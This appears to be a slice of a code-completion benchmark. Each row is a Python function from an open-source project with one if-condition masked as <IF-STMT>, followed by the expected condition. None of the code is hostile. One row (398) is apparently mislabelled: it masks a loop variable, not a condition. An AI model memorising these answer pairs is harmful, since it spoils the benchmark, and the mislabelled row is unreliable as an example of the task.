349,"def __init__(self, user, *args, **kwargs):<tab>""Sets choices and initial value""<tab>super(SettingsForm, self).__init__(*args, **kwargs)<tab>self.fields[""default_changeset_status""].queryset = ChangeSetStatus.objects.filter(<tab><tab>trash=False<tab>)<tab>try:<tab><tab>conf = ModuleSetting.get_for_module(<tab><tab><tab>""treeio.changes"", ""default_changeset_status""<tab><tab>)[0]<tab><tab>default_changeset_status = ChangeSetStatus.objects.get(pk=long(conf.value))<tab><tab><IF-STMT><tab><tab><tab>self.fields[<tab><tab><tab><tab>""default_changeset_status""<tab><tab><tab>].initial = default_changeset_status.id<tab>except Exception:<tab><tab>pass",if not default_changeset_status . trash :,191
350,"def load(self):<tab>""""""Method for loading a feature""""""<tab>with self.filesystem.openbin(self.path, ""r"") as file_handle:<tab><tab><IF-STMT><tab><tab><tab>with gzip.open(file_handle, ""rb"") as gzip_fp:<tab><tab><tab><tab>return self._decode(gzip_fp, self.path)<tab><tab>return self._decode(file_handle, self.path)",if self . path . endswith ( FileFormat . GZIP . extension ( ) ) :,108
351,"def edge2str(self, nfrom, nto):<tab>if isinstance(nfrom, ExprCompose):<tab><tab>for i in nfrom.args:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return ""[%s, %s]"" % (i[1], i[2])<tab>elif isinstance(nfrom, ExprCond):<tab><tab>if nfrom.cond == nto:<tab><tab><tab>return ""?""<tab><tab>elif nfrom.src1 == nto:<tab><tab><tab>return ""True""<tab><tab>elif nfrom.src2 == nto:<tab><tab><tab>return ""False""<tab>return """"",if i [ 0 ] == nto :,149
352,"def disable_verity():<tab>""""""Disables dm-verity on the device.""""""<tab>with log.waitfor(""Disabling dm-verity on %s"" % context.device):<tab><tab>root()<tab><tab>with AdbClient() as c:<tab><tab><tab>reply = c.disable_verity()<tab><tab>if ""Verity already disabled"" in reply:<tab><tab><tab>return<tab><tab>elif ""Now reboot your device"" in reply:<tab><tab><tab>reboot(wait=True)<tab><tab><IF-STMT><tab><tab><tab>return  # Emulator doesnt support Verity?<tab><tab>else:<tab><tab><tab>log.error(""Could not disable verity:\n%s"" % reply)","elif ""0006closed"" in reply :",165
353,"def __demo_mode_pause_if_active(self, tiny=False):<tab>if self.demo_mode:<tab><tab>wait_time = settings.DEFAULT_DEMO_MODE_TIMEOUT<tab><tab>if self.demo_sleep:<tab><tab><tab>wait_time = float(self.demo_sleep)<tab><tab><IF-STMT><tab><tab><tab>time.sleep(wait_time)<tab><tab>else:<tab><tab><tab>time.sleep(wait_time / 3.4)<tab>elif self.slow_mode:<tab><tab>self.__slow_mode_pause_if_active()",if not tiny :,134
354,"def dictToKW(d):<tab>out = []<tab>items = list(d.items())<tab>items.sort()<tab>for k, v in items:<tab><tab><IF-STMT><tab><tab><tab>raise NonFormattableDict(""%r ain't a string"" % k)<tab><tab>if not r.match(k):<tab><tab><tab>raise NonFormattableDict(""%r ain't an identifier"" % k)<tab><tab>out.append(""\n\0{}={},"".format(k, prettify(v)))<tab>return """".join(out)","if not isinstance ( k , str ) :",131
355,"def createCommonCommands(self):<tab>""""""Handle all global @command nodes.""""""<tab>c = self.c<tab>aList = c.config.getCommands() or []<tab>for z in aList:<tab><tab>p, script = z<tab><tab>gnx = p.v.gnx<tab><tab><IF-STMT><tab><tab><tab>self.seen.add(gnx)<tab><tab><tab>script = self.getScript(p)<tab><tab><tab>self.createCommonCommand(p, script)",if gnx not in self . seen :,121
356,"def _decodeFromStream(self, s):<tab>""""""Decode a complete DER OBJECT ID from a file.""""""<tab># Fill up self.payload<tab>DerObject._decodeFromStream(self, s)<tab># Derive self.value from self.payload<tab>p = BytesIO_EOF(self.payload)<tab>comps = list(map(str, divmod(p.read_byte(), 40)))<tab>v = 0<tab>while p.remaining_data():<tab><tab>c = p.read_byte()<tab><tab>v = v * 128 + (c & 0x7F)<tab><tab><IF-STMT><tab><tab><tab>comps.append(str(v))<tab><tab><tab>v = 0<tab>self.value = ""."".join(comps)",if not ( c & 0x80 ) :,174
357,"def tiles_around_factor(self, factor, pos, radius=1, predicate=None):<tab>ps = []<tab>x, y = pos<tab>for dx in range(-radius, radius + 1):<tab><tab>nx = x + dx<tab><tab><IF-STMT><tab><tab><tab>for dy in range(-radius, radius + 1):<tab><tab><tab><tab>ny = y + dy<tab><tab><tab><tab>if ny >= 0 and ny < self.height * factor and (dx != 0 or dy != 0):<tab><tab><tab><tab><tab>if predicate is None or predicate((nx, ny)):<tab><tab><tab><tab><tab><tab>ps.append((nx, ny))<tab>return ps",if nx >= 0 and nx < self . width * factor :,159
358,"def deleteAllMatchers(self):<tab>""""""Deletes all matchers.""""""<tab>if self.__filter:<tab><tab>result = QtWidgets.QMessageBox.question(<tab><tab><tab>self,<tab><tab><tab>""Delete All Matchers?"",<tab><tab><tab>""Are you sure you want to delete all matchers?"",<tab><tab><tab>QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self._itemsLock.lockForWrite()<tab><tab><tab>try:<tab><tab><tab><tab>for item in list(self._items.values()):<tab><tab><tab><tab><tab>item.rpcObject.delete()<tab><tab><tab>finally:<tab><tab><tab><tab>self._itemsLock.unlock()<tab><tab><tab>self.removeAllItems()",if result == QtWidgets . QMessageBox . Yes :,186
359,"def _parse_icons(self, icons):<tab><IF-STMT><tab><tab>icons = get_iterated_icons(icons)<tab>for icon in icons:<tab><tab>if isinstance(icons, list):<tab><tab><tab>icon = Icon(icon)<tab><tab>else:<tab><tab><tab>icon = Icon(icons[icon])<tab><tab>if icon.exists:  # If icon found on current Gtk Icon theme<tab><tab><tab>self.icons.append(icon)","if isinstance ( icons , list ) :",107
360,"def change_misc_visibility(self, on_start=False):<tab>if self.misc.isVisible():<tab><tab>self._splitterMainSizes = self._splitterMain.sizes()<tab><tab>self.misc.hide()<tab><tab>widget = self.mainContainer.get_actual_widget()<tab><tab><IF-STMT><tab><tab><tab>widget.setFocus()<tab>else:<tab><tab>self.misc.show()<tab><tab>self.misc.gain_focus()",if widget :,108
361,"def is_checked_sls_template(template):<tab>if template.__contains__(""provider""):<tab><tab># Case provider is a dictionary<tab><tab>if isinstance(template[""provider""], dict_node):<tab><tab><tab>if template[""provider""].get(""name"").lower() not in SUPPORTED_PROVIDERS:<tab><tab><tab><tab>return False<tab><tab># Case provider is direct provider name<tab><tab>if isinstance(template[""provider""], str_node):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>return True<tab>return False","if template [ ""provider"" ] not in SUPPORTED_PROVIDERS :",131
362,"def check_index(self, is_sorted=True, unique=True, index=None):<tab>""""""Sanity checks""""""<tab>if not index:<tab><tab>index = self.index<tab>if is_sorted:<tab><tab>test = pd.DataFrame(lrange(len(index)), index=index)<tab><tab>test_sorted = test.sort()<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Data is not be sorted"")<tab>if unique:<tab><tab>if len(index) != len(index.unique()):<tab><tab><tab>raise Exception(""Duplicate index entries"")",if not test . index . equals ( test_sorted . index ) :,142
363,"def _update_actions(self, *_ignored):<tab>""""""Updates menu actions to reflect the current layer's mode""""""<tab>if self._updating:<tab><tab>return<tab>self._updating = True<tab>rootstack = self._model.layer_stack<tab>current = rootstack.current<tab>for mode, item in self._menu_items:<tab><tab>active = mode == current.mode<tab><tab><IF-STMT><tab><tab><tab>item.set_active(active)<tab><tab>item.set_sensitive(mode in current.PERMITTED_MODES)<tab>self._updating = False",if bool ( item . get_active ( ) ) != active :,140
364,"def _charlabels(self, options):<tab>""""""Get labels for characters (PRIVATE).""""""<tab>self.charlabels = {}<tab>opts = CharBuffer(options)<tab>while True:<tab><tab># get id and state<tab><tab>w = opts.next_word()<tab><tab><IF-STMT>  # McClade saves and reads charlabel-lists with terminal comma?!<tab><tab><tab>break<tab><tab>identifier = self._resolve(w, set_type=CHARSET)<tab><tab>state = quotestrip(opts.next_word())<tab><tab>self.charlabels[identifier] = state<tab><tab># check for comma or end of command<tab><tab>c = opts.next_nonwhitespace()<tab><tab>if c is None:<tab><tab><tab>break<tab><tab>elif c != "","":<tab><tab><tab>raise NexusError(""Missing ',' in line %s."" % options)",if w is None :,198
365,"def get_and_set_titles(self):<tab>all_titles = []<tab>for page in self.pages:<tab><tab><IF-STMT><tab><tab><tab>all_titles.append(page.orig_phrase)<tab><tab><tab>all_titles.append(page.orig_phrase_norm)<tab><tab>if page.wiki_title != """":<tab><tab><tab>all_titles.append(page.wiki_title)<tab><tab><tab>all_titles.append(page.wiki_title_norm)<tab>return set(all_titles)","if page . orig_phrase != """" :",127
366,"def get_content_length(download):<tab>try:<tab><tab>meta = download.info()<tab><tab><IF-STMT><tab><tab><tab>return int(meta.getheaders(""Content-Length"")[0])<tab><tab>elif hasattr(download, ""getheader"") and download.getheader(""Content-Length""):<tab><tab><tab>return int(download.getheader(""Content-Length""))<tab><tab>elif hasattr(meta, ""getheader"") and meta.getheader(""Content-Length""):<tab><tab><tab>return int(meta.getheader(""Content-Length""))<tab>except Exception:<tab><tab>pass<tab>return 0","if hasattr ( meta , ""getheaders"" ) and hasattr ( meta . getheaders , ""Content-Length"" ) :",149
367,"def connect_reader_to_writer(reader, writer):<tab>BUF_SIZE = 8192<tab>try:<tab><tab>while True:<tab><tab><tab>data = await reader.read(BUF_SIZE)<tab><tab><tab>if not data:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>writer.write_eof()<tab><tab><tab><tab><tab>await writer.drain()<tab><tab><tab><tab>return<tab><tab><tab>writer.write(data)<tab><tab><tab>await writer.drain()<tab>except (OSError, asyncio.IncompleteReadError) as e:<tab><tab>pass",if not writer . transport . is_closing ( ) :,139
368,"def _record_shell(ex, files, bind_rez=True, print_msg=False):<tab>ex.source(context_file)<tab>if startup_sequence[""envvar""]:<tab><tab>ex.unsetenv(startup_sequence[""envvar""])<tab>if add_rez and bind_rez:<tab><tab>ex.interpreter._bind_interactive_rez()<tab>if print_msg and add_rez and not quiet:<tab><tab>ex.info("""")<tab><tab>ex.info(""You are now in a rez-configured environment."")<tab><tab>ex.info("""")<tab><tab><IF-STMT><tab><tab><tab>ex.command(""rezolve context"")",if system . is_production_rez_install :,159
369,"def set_torrent_ratio(self, torrent_ids, ratio):<tab>try:<tab><tab>if not self.connect():<tab><tab><tab>return False<tab><tab>self.client.core.set_torrent_stop_at_ratio(torrent_ids, True).get()<tab><tab>self.client.core.set_torrent_stop_ratio(torrent_ids, ratio).get()<tab>except Exception as err:<tab><tab>return False<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>self.disconnect()<tab>return True",if self . client :,125
370,"def __decrypt_bin_sum(encrypted_bin_sum, cipher):<tab># for feature_sum in encrypted_bin_sum:<tab>decrypted_list = {}<tab>for col_name, count_list in encrypted_bin_sum.items():<tab><tab>new_list = []<tab><tab>for event_count, non_event_count in count_list:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>event_count = cipher.decrypt(event_count)<tab><tab><tab>if isinstance(non_event_count, PaillierEncryptedNumber):<tab><tab><tab><tab>non_event_count = cipher.decrypt(non_event_count)<tab><tab><tab>new_list.append((event_count, non_event_count))<tab><tab>decrypted_list[col_name] = new_list<tab>return decrypted_list","if isinstance ( event_count , PaillierEncryptedNumber ) :",198
371,"def processVideo(self, track):<tab>video = Metadata(self)<tab>self.trackCommon(track, video)<tab>try:<tab><tab>video.compression = track[""CodecID/string""].value<tab><tab><IF-STMT><tab><tab><tab>video.width = track[""Video/PixelWidth/unsigned""].value<tab><tab><tab>video.height = track[""Video/PixelHeight/unsigned""].value<tab>except MissingField:<tab><tab>pass<tab>self.addGroup(""video[]"", video, ""Video stream"")","if ""Video"" in track :",120
372,"def check_br_addr(self, br):<tab>ips = {}<tab>cmd = ""ip a show dev %s"" % br<tab>for line in self.execute(cmd, sudo=True).split(""\n""):<tab><tab><IF-STMT><tab><tab><tab>elems = [e.strip() for e in line.strip().split("" "")]<tab><tab><tab>ips[4] = elems[1]<tab><tab>elif line.strip().startswith(""inet6 ""):<tab><tab><tab>elems = [e.strip() for e in line.strip().split("" "")]<tab><tab><tab>ips[6] = elems[1]<tab>return ips","if line . strip ( ) . startswith ( ""inet "" ) :",149
373,"def _find_line_in_file(file_path, search_pattern):<tab>try:<tab><tab>with open(file_path, ""r"", encoding=""utf-8"") as search_file:<tab><tab><tab>for line in search_file:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return True<tab>except (OSError, IOError):<tab><tab>pass<tab>return False",if search_pattern in line :,94
374,"def setOption(self, key, value):<tab>if key in VALID_OPTIONS:<tab><tab>old = self.getOption(key)<tab><tab>result = VALID_OPTIONS[key](self, value)<tab><tab>self.notifyOptionChanged(key, old, value)<tab><tab><IF-STMT><tab><tab><tab>return result[1]<tab><tab>else:<tab><tab><tab>raise RopperError(""Invalid value for option %s: %s"" % (key, value))<tab>else:<tab><tab>raise RopperError(""Invalid option"")",if result :,124
375,"def _para_exploit(self, params, part):<tab>if len(params) == 0:<tab><tab>arr = [""*"", ""config""] + self._configs.keys()<tab><tab>return suggest(arr, part)<tab>if len(params) == 1:<tab><tab>arr = []<tab><tab>if params[0] == ""config"":<tab><tab><tab>arr = self._configs.keys()<tab><tab><IF-STMT><tab><tab><tab>arr = [""stopOnFirst""]<tab><tab>return suggest(arr, part)<tab>return []","if params [ 0 ] == ""*"" :",124
376,"def render(self, context):<tab>for var in self.vars:<tab><tab>value = var.resolve(context, True)<tab><tab>if value:<tab><tab><tab>first = render_value_in_context(value, context)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>context[self.asvar] = first<tab><tab><tab><tab>return """"<tab><tab><tab>return first<tab>return """"",if self . asvar :,95
377,"def insertTestData(self, rows):<tab>for row in rows:<tab><tab>if isinstance(row, Log):<tab><tab><tab>self.logs[row.id] = row.values.copy()<tab>for row in rows:<tab><tab>if isinstance(row, LogChunk):<tab><tab><tab>lines = self.log_lines.setdefault(row.logid, [])<tab><tab><tab># make sure there are enough slots in the list<tab><tab><tab><IF-STMT><tab><tab><tab><tab>lines.append([None] * (row.last_line + 1 - len(lines)))<tab><tab><tab>row_lines = row.content.decode(""utf-8"").split(""\n"")<tab><tab><tab>lines[row.first_line : row.last_line + 1] = row_lines",if len ( lines ) < row . last_line + 1 :,187
378,"def set_available_qty(self):<tab>for d in self.get(""required_items""):<tab><tab>if d.source_warehouse:<tab><tab><tab>d.available_qty_at_source_warehouse = get_latest_stock_qty(<tab><tab><tab><tab>d.item_code, d.source_warehouse<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>d.available_qty_at_wip_warehouse = get_latest_stock_qty(<tab><tab><tab><tab>d.item_code, self.wip_warehouse<tab><tab><tab>)",if self . wip_warehouse :,136
379,"def add_pref_observer(self, name, callback):<tab>self.log.debug(""Adding pref observer for %s"", name)<tab>try:<tab><tab>self._observers[name].add(callback)<tab>except KeyError:<tab><tab>self._observers[name] = set([callback])<tab><tab><IF-STMT><tab><tab><tab>self._send(command=""global-prefs-observe"", add=[name])<tab><tab>else:<tab><tab><tab># We can't actually trigger prefs observer changes on document<tab><tab><tab># level prefs; that's mostly okay, though, since we just pass<tab><tab><tab># the whole prefs environment every time we do something with a<tab><tab><tab># document instead.<tab><tab><tab>pass",if self . _send :,165
380,"def __setattr__(self, key: str, value) -> None:<tab>try:<tab><tab>object.__getattribute__(self, key)<tab><tab>return object.__setattr__(self, key, value)<tab>except AttributeError:<tab><tab>pass<tab>if (key,) in self._internal.column_labels:<tab><tab>self[key] = value<tab>else:<tab><tab>msg = ""Koalas doesn't allow columns to be created via a new attribute name""<tab><tab><IF-STMT><tab><tab><tab>raise AssertionError(msg)<tab><tab>else:<tab><tab><tab>warnings.warn(msg, UserWarning)",if is_testing ( ) :,139
381,"def inverse_transform(self, X):<tab>results = []<tab>column_counter = 0<tab>for i, binarizer in enumerate(self.binarizers):<tab><tab>n_cols = binarizer.classes_.shape[0]<tab><tab>x_subset = X[:, column_counter : column_counter + n_cols]<tab><tab>inv = binarizer.inverse_transform(x_subset)<tab><tab><IF-STMT><tab><tab><tab>inv = inv[:, np.newaxis]<tab><tab>results.append(inv)<tab><tab>column_counter += n_cols<tab>return np.concatenate(results, axis=1)",if len ( inv . shape ) == 1 :,144
382,"def default_generator(<tab>self, dataset, epochs=1, mode=""fit"", deterministic=True, pad_batches=True):<tab>for epoch in range(epochs):<tab><tab>for (X_b, y_b, w_b, ids_b) in dataset.iterbatches(<tab><tab><tab>batch_size=self.batch_size,<tab><tab><tab>deterministic=deterministic,<tab><tab><tab>pad_batches=pad_batches,<tab><tab>):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>dropout = np.array(False)<tab><tab><tab>else:<tab><tab><tab><tab>dropout = np.array(True)<tab><tab><tab>yield ([X_b, dropout], [y_b], [w_b])","if mode == ""predict"" :",168
383,"def modif(dir, name, fun):<tab>""""""Call a substitution function""""""<tab>if name == ""*"":<tab><tab>lst = []<tab><tab>for y in "". Tools extras"".split():<tab><tab><tab>for x in os.listdir(os.path.join(dir, y)):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>lst.append(y + os.sep + x)<tab><tab>for x in lst:<tab><tab><tab>modif(dir, x, fun)<tab><tab>return<tab>filename = os.path.join(dir, name)<tab>with open(filename, ""r"") as f:<tab><tab>txt = f.read()<tab>txt = fun(txt)<tab>with open(filename, ""w"") as f:<tab><tab>f.write(txt)","if x . endswith ( "".py"" ) :",186
384,"def find_last_match(view, what, start, end, flags=0):<tab>""""""Find last occurrence of `what` between `start`, `end`.""""""<tab>match = view.find(what, start, flags)<tab>new_match = None<tab>while match:<tab><tab>new_match = view.find(what, match.end(), flags)<tab><tab><IF-STMT><tab><tab><tab>match = new_match<tab><tab>else:<tab><tab><tab>return match",if new_match and new_match . end ( ) <= end :,119
385,"def to_dynamic_cwd_tuple(x):<tab>""""""Convert to a canonical cwd_width tuple.""""""<tab>unit = ""c""<tab>if isinstance(x, str):<tab><tab><IF-STMT><tab><tab><tab>x = x[:-1]<tab><tab><tab>unit = ""%""<tab><tab>else:<tab><tab><tab>unit = ""c""<tab><tab>return (float(x), unit)<tab>else:<tab><tab>return (float(x[0]), x[1])","if x [ - 1 ] == ""%"" :",111
386,"def get_lprobs_and_target(self, model, net_output, sample):<tab>lprobs = model.get_normalized_probs(net_output, log_probs=True)<tab>target = model.get_targets(sample, net_output)<tab>if self.ignore_prefix_size > 0:<tab><tab><IF-STMT><tab><tab><tab>lprobs = lprobs[:, self.ignore_prefix_size :, :].contiguous()<tab><tab><tab>target = target[:, self.ignore_prefix_size :].contiguous()<tab><tab>else:<tab><tab><tab>lprobs = lprobs[self.ignore_prefix_size :, :, :].contiguous()<tab><tab><tab>target = target[self.ignore_prefix_size :, :].contiguous()<tab>return lprobs.view(-1, lprobs.size(-1)), target.view(-1)","if getattr ( lprobs , ""batch_first"" , False ) :",197
387,"def _charlabels(self, options):<tab>""""""Get labels for characters (PRIVATE).""""""<tab>self.charlabels = {}<tab>opts = CharBuffer(options)<tab>while True:<tab><tab># get id and state<tab><tab>w = opts.next_word()<tab><tab>if w is None:  # McClade saves and reads charlabel-lists with terminal comma?!<tab><tab><tab>break<tab><tab>identifier = self._resolve(w, set_type=CHARSET)<tab><tab>state = quotestrip(opts.next_word())<tab><tab>self.charlabels[identifier] = state<tab><tab># check for comma or end of command<tab><tab>c = opts.next_nonwhitespace()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>elif c != "","":<tab><tab><tab>raise NexusError(""Missing ',' in line %s."" % options)",if c is None :,198
388,"def _parseContributors(self, roleType, Contributors):<tab>if Contributors is None:<tab><tab>return None<tab>try:<tab><tab>ret = []<tab><tab>for item in Contributors[""items""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret.append(item[""name""])<tab><tab>return ret<tab>except:<tab><tab>return None","if item [ ""role"" ] == roleType :",100
389,"def _data_interp(self):<tab>if self.pending_points:<tab><tab>points = list(self.pending_points)<tab><tab><IF-STMT><tab><tab><tab>values = self.ip()(self._scale(points))<tab><tab>else:<tab><tab><tab># Without the bounds the interpolation cannot be done properly,<tab><tab><tab># so we just set everything to zero.<tab><tab><tab>values = np.zeros((len(points), self.vdim))<tab><tab>return points, values<tab>return np.zeros((0, 2)), np.zeros((0, self.vdim), dtype=float)",if self . bounds_are_done :,144
390,"def _initCaseSets(self):<tab>self._cs = {}<tab>self._css = {}<tab>for cs in self._caseSets:<tab><tab><IF-STMT><tab><tab><tab>self._cs[cs.CaseSetName] = {}<tab><tab><tab>self._css[cs.CaseSetName] = cs<tab><tab>else:<tab><tab><tab>raise Exception(""duplicate case set name"")<tab><tab>for c in cs.Cases:<tab><tab><tab>idx = tuple(c.index)<tab><tab><tab>if not self._cs[cs.CaseSetName].has_key(idx):<tab><tab><tab><tab>self._cs[cs.CaseSetName][idx] = c<tab><tab><tab>else:<tab><tab><tab><tab>raise Exception(""duplicate case index"")",if not self . _cs . has_key ( cs . CaseSetName ) :,178
391,"def _organize_data(self, data):<tab>temporary = {}<tab>for line in data.splitlines():<tab><tab>category, _, value = line.partition("" "")<tab><tab><IF-STMT><tab><tab><tab>key, _, value = value.partition("" "")<tab><tab><tab>temporary[key] = value<tab><tab>else:<tab><tab><tab>temporary[category] = value<tab>return temporary","if category in ( ""set"" , ""tag"" ) :",93
392,"def get(self):<tab>""""""Returns a simple HTML for contact form""""""<tab>if self.user:<tab><tab>user_info = models.User.get_by_id(long(self.user_id))<tab><tab>if user_info.name or user_info.last_name:<tab><tab><tab>self.form.name.data = user_info.name + "" "" + user_info.last_name<tab><tab><IF-STMT><tab><tab><tab>self.form.email.data = user_info.email<tab>params = {""exception"": self.request.get(""exception"")}<tab>return self.render_template(""boilerplate_contact.html"", **params)",if user_info . email :,155
393,"def parseBamPEFDistributionFile(self, f):<tab>d = dict()<tab>lastsample = []<tab>for line in f[""f""].splitlines():<tab><tab>cols = line.rstrip().split(""\t"")<tab><tab>if cols[0] == ""#bamPEFragmentSize"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>s_name = self.clean_s_name(cols[2].rstrip().split(""/"")[-1], f[""root""])<tab><tab><tab>if s_name != lastsample:<tab><tab><tab><tab>d[s_name] = dict()<tab><tab><tab><tab>lastsample = s_name<tab><tab><tab>d[s_name].update({self._int(cols[0]): self._int(cols[1])})<tab>return d","elif cols [ 0 ] == ""Size"" :",194
394,"def _related(self):<tab>if self.__related is None:<tab><tab>results = requests.get(<tab><tab><tab>f""{self._wordnet_corpus_reader.host()}/api/synsets/{self.pos()}/{self.offset()}/relations/?format=json"",<tab><tab><tab>timeout=(30.0, 90.0),<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.__related = results.json()[""results""][0][""relations""]<tab><tab>else:<tab><tab><tab>self.__related = []<tab>return self.__related","if results and len ( results . json ( ) [ ""results"" ] ) != 0 :",135
395,"def autoname(self):<tab>if self.company:<tab><tab>suffix = "" - "" + frappe.get_cached_value(""Company"", self.company, ""abbr"")<tab><tab><IF-STMT><tab><tab><tab>self.name = self.warehouse_name + suffix<tab>else:<tab><tab>self.name = self.warehouse_name",if not self . warehouse_name . endswith ( suffix ) :,88
396,"def escape_string(self, value):<tab>value = EscapedString.promote(value)<tab>value = value.expanduser()<tab>result = """"<tab>for is_literal, txt in value.strings:<tab><tab><IF-STMT><tab><tab><tab>txt = pipes.quote(txt)<tab><tab><tab>if not txt.startswith(""'""):<tab><tab><tab><tab>txt = ""'%s'"" % txt<tab><tab>else:<tab><tab><tab>txt = txt.replace(""\\"", ""\\\\"")<tab><tab><tab>txt = txt.replace('""', '\\""')<tab><tab><tab>txt = '""%s""' % txt<tab><tab>result += txt<tab>return result",if is_literal :,139
397,"def downgrade_wsgi_ux_to_1x(environ):<tab>""""""Return a new environ dict for WSGI 1.x from the given WSGI u.x environ.""""""<tab>env1x = {}<tab>url_encoding = environ[ntou(""wsgi.url_encoding"")]<tab>for k, v in list(environ.items()):<tab><tab>if k in [ntou(""PATH_INFO""), ntou(""SCRIPT_NAME""), ntou(""QUERY_STRING"")]:<tab><tab><tab>v = v.encode(url_encoding)<tab><tab><IF-STMT><tab><tab><tab>v = v.encode(""ISO-8859-1"")<tab><tab>env1x[k.encode(""ISO-8859-1"")] = v<tab>return env1x","elif isinstance ( v , unicodestr ) :",172
398,"def __repr__(self):<tab>rt = ""Network<tab><tab> Netmask<tab><tab> Gateway<tab><tab> Iface<tab><tab>   Output IP\n""<tab>for net, msk, gw, <IF-STMT> addr in self.routes:<tab><tab>rt += ""%-15s %-15s %-15s %-15s %-15s\n"" % (<tab><tab><tab>ltoa(net),<tab><tab><tab>ltoa(msk),<tab><tab><tab>gw,<tab><tab><tab>iface,<tab><tab><tab>addr,<tab><tab>)<tab>return rt","iface ,",148
399,"def nearest_sources_Point(<tab>self, point: Point, max_dist=float(""inf"")):  # sys.float_info.max):<tab>bp, bn, bi, bd = None, None, None, None<tab>for rfsource in self.rfsources:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>hp, hn, hi, hd = rfsource.nearest(point, max_dist=max_dist)<tab><tab>if bp is None or (hp is not None and hd < bd):<tab><tab><tab>bp, bn, bi, bd = hp, hn, hi, hd<tab>return (bp, bn, bi, bd)",if not self . get_rfsource_snap ( rfsource ) :,163
400,"def restoreParent(self):<tab>if self.sid.isRoot:<tab><tab>return<tab>with self.suspendMouseButtonNavigation():<tab><tab>confirm, opt = self.confirmRestore((self.path,))<tab><tab>if not confirm:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>return<tab>rd = RestoreDialog(self, self.sid, self.path, **opt)<tab>rd.exec()","if opt [ ""delete"" ] and not self . confirmDelete ( warnRoot = self . path == ""/"" ) :",114
401,"def connect(self):<tab>if self.reserved_ports:<tab><tab>self.get_reserved_port()<tab>self.sock.settimeout(10)<tab>max_attempts = 3<tab>for i in range(max_attempts):<tab><tab>try:<tab><tab><tab>rv = super(WSClient, self).connect()<tab><tab>except OSError as e:<tab><tab><tab># Lets retry a few times in case the error is<tab><tab><tab># [Errno 48] Address already in use<tab><tab><tab># which I believe may be caused by a race condition<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>raise<tab><tab>else:<tab><tab><tab>break<tab>if self.sock:<tab><tab>self.sock.settimeout(None)<tab>return rv",if e . errno == errno . EADDRINUSE and i < max_attempts - 1 :,193
402,"def step(self, action):<tab>assert self.action_space.contains(action)<tab>if self._state == 4:<tab><tab>if action and self._case:<tab><tab><tab>return self._state, 10.0, True, {}<tab><tab>else:<tab><tab><tab>return self._state, -10, True, {}<tab>else:<tab><tab>if action:<tab><tab><tab>if self._state == 0:<tab><tab><tab><tab>self._state = 2<tab><tab><tab>else:<tab><tab><tab><tab>self._state += 1<tab><tab><IF-STMT><tab><tab><tab>self._state = self._case<tab>return self._state, -1, False, {}",elif self . _state == 2 :,157
403,"def process(self):<tab>inputs = self.node.inputs<tab>outputs = self.node.outputs<tab>data = [s.sv_get()[0] for s in inputs]<tab>for socket, ref in zip(outputs, self.outputs):<tab><tab><IF-STMT><tab><tab><tab>func = getattr(self, ref[2])<tab><tab><tab>out = tuple(itertools.starmap(func, sv_zip_longest(*data)))<tab><tab><tab>socket.sv_set(out)",if socket . links :,113
404,"def filter_queryset(self, request, queryset, view):<tab>if (<tab><tab>self.filter_name in request.QUERY_PARAMS<tab><tab>or self.exclude_param_name in request.QUERY_PARAMS<tab>):<tab><tab>projects_ids_subquery = self.filter_user_projects(request)<tab><tab><IF-STMT><tab><tab><tab>queryset = queryset.filter(project_id__in=projects_ids_subquery)<tab>return super().filter_queryset(request, queryset, view)",if projects_ids_subquery :,118
405,"def _is_port_in_range(self, ports_list):<tab>for port_range in ports_list[0]:<tab><tab>port = force_int(port_range)<tab><tab>if port and self.port == port:<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>[from_port, to_port] = port_range.split(""-"")<tab><tab><tab><tab>if int(from_port) <= self.port <= int(to_port):<tab><tab><tab><tab><tab>return True<tab><tab><tab>except Exception:<tab><tab><tab><tab>return CheckResult.UNKNOWN<tab>return False","if port is None and ""-"" in port_range :",154
406,"def apply_to(cls, lexer):<tab># Apply a font for all styles<tab>lexer.setFont(Font().load())<tab>for name, font in cls.__dict__.items():<tab><tab>if not isinstance(font, Font):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>style_num = getattr(lexer, name)<tab><tab><tab>lexer.setColor(QColor(font.color), style_num)<tab><tab><tab>lexer.setEolFill(True, style_num)<tab><tab><tab>lexer.setPaper(QColor(font.paper), style_num)<tab><tab><tab>lexer.setFont(font.load(), style_num)","if hasattr ( lexer , name ) :",158
407,"def set_columns(worksheet, c, lengths):<tab>for col, j in enumerate(c):<tab><tab>if j == ""Value"":<tab><tab><tab>j = "" "" * 18<tab><tab><IF-STMT><tab><tab><tab>j = ""Descr""<tab><tab>lengths[col] = max(len(j) + 5, lengths[col])<tab><tab>worksheet.set_column(col, col, lengths[col])","if j == ""Description"" :",101
408,"def _remove_listners(self):<tab>object = self.object<tab>kids = self.children_cache<tab>for key, val in kids.items():<tab><tab><IF-STMT><tab><tab><tab>vtk_obj = tvtk.to_vtk(val)<tab><tab><tab>messenger.disconnect(vtk_obj, ""ModifiedEvent"", self._notify_children)<tab><tab>else:<tab><tab><tab>object.on_trait_change(self._notify_children, key, remove=True)","if isinstance ( val , tvtk . Collection ) :",123
